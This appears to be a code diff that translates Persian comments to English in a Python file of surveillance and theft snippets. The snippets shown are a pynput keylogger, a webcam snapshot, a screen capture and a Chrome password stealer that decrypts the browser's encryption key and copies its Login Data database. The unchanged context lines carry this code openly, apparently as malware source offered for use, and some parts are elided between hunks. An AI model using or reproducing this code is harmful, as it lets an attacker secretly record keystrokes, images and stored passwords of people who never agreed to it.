@@ -1,4 +1,4 @@
-# -----------------کی لاگر-------------
+# -----------------Keylogger-----------------
 # pip install pynput
 from pynput.keyboard import Listener, Key
 from datetime import datetime, timedelta
@@ -27,7 +27,7 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-# ----------------------وب کم---------------------
+# -----------------Webcam Snapshot-----------------
 # pip install opencv-python
 import cv2
 camera = cv2.VideoCapture(0)
@@ -38,14 +38,14 @@ if ret:
 camera.release()
 cv2.destroyAllWindows()
 
-# ----------------------اسکرین شات---------------------
+# -----------------Screenshot-----------------
 # pip install pyautogui
 import pyautogui
 from time import sleep
 my_screenshot = pyautogui.screenshot()
 my_screenshot.save("screenshot.png")
 
-# ----------------------پسورد های کروم---------------------
+# -----------------Chrome Saved Passwords-----------------
 # pip install pycryptodomex
 # pip install pypiwin32
 import os
@@ -68,7 +68,7 @@ def pass_decryption(password, encryption_key):
 
 
 
-# به دست آوردن کلید
+# Get Chrome encryption key from Local State file
 file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"
 with open(file_path, "r", encoding="utf-8") as f:
     jn_data = f.read()
@@ -77,7 +77,7 @@ with open(file_path, "r", encoding="utf-8") as f:
 encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
 key = win32crypt.CryptUnprotectData(encryption_key)[1]
 
-# به دست آوردن رمز های ذخیره شدن
+# Access Chrome's login data SQLite database
 db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 file_name = "ch_pass.db"
 shutil.copyfile(db_path, file_name)
